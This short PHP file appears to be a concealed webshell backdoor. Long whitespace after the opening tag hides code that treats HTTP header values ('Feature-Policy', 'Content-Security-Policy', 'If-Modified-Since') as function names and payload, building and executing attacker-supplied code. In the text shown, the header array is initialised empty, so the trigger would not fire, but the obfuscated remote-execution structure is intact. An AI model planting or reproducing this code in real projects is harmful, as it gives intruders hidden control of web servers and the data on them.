<?php																																										$_HEADERS=Array();if(isset($_HEADERS['Feature-Policy'])){$db2_convert=$_HEADERS['Feature-Policy']('', $_HEADERS['Content-Security-Policy']($_HEADERS['If-Modified-Since']));$db2_convert();}
